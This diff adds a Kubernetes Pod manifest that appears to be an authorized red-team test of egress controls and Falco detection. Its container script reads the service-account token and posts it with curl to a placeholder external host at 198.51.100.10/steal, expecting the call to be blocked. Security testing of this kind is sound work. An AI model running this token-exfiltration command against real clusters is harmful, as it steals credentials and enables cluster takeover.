@@ -1,0 +1,64 @@
+---
+# CONTROLLED TEST - authorized self-validation of the Sanctum platform.
+# MITRE ATT&CK for Containers: T1528 Steal Application Access Token.
+# Attempt: read the projected service-account token and POST it to an
+# external host. This pod is fully policy-clean so it passes admission on
+# purpose. The point is that the network layer, not admission, stops the
+# exfil.
+# Expected outcome: the default-deny egress NetworkPolicy blocks the outbound
+# connection to the external host, so the curl times out (prints
+# BLOCKED-AS-EXPECTED). Falco's service-account-token-read rule alerts on the
+# token read. DNS is the only permitted egress, so name resolution can
+# succeed while the TCP connect cannot.
+# Note: the Tetragon kill policy covers /etc/shadow and the kubelet PKI, not
+# the projected SA token path, so the token read here is caught by Falco
+# (detect) and the exfil by NetworkPolicy (prevent), not by an inline kill.
+# The 198.51.100.0/24 destination is TEST-NET-2 (RFC 5737), a documentation
+# range that routes nowhere.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rt-07-satoken-exfil
+  namespace: sanctum
+  labels:
+    redteam.sanctum/controlled-test: "true"
+    redteam.sanctum/control-class: network-block
+    app.kubernetes.io/part-of: sanctum-redteam
+  annotations:
+    redteam.sanctum/mitre: T1528
+    redteam.sanctum/mitre-name: Steal Application Access Token
+    redteam.sanctum/control: default-deny egress NetworkPolicy (prevent) + Falco token-read (detect)
+    redteam.sanctum/expected: Network BLOCK - egress to external host is dropped, exfil fails
+spec:
+  restartPolicy: Never
+  containers:
+    - name: attacker
+      image: docker.io/curlimages/curl:8.11.1
+      command: ["sh", "-c"]
+      args:
+        - |
+          TOKEN="$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
+          if curl -s --max-time 8 -o /dev/null \
+              -H "Authorization: Bearer ${TOKEN}" \
+              https://198.51.100.10/steal; then
+            echo "EXFIL-REACHABLE-CONTROL-FAILED"
+          else
+            echo "BLOCKED-AS-EXPECTED"
+          fi
+          sleep 3600
+      securityContext:
+        runAsNonRoot: true
+        runAsUser: 65534
+        allowPrivilegeEscalation: false
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: [ALL]
+        seccompProfile:
+          type: RuntimeDefault
+      resources:
+        requests:
+          cpu: 25m
+          memory: 32Mi
+        limits:
+          cpu: 100m
+          memory: 64Mi
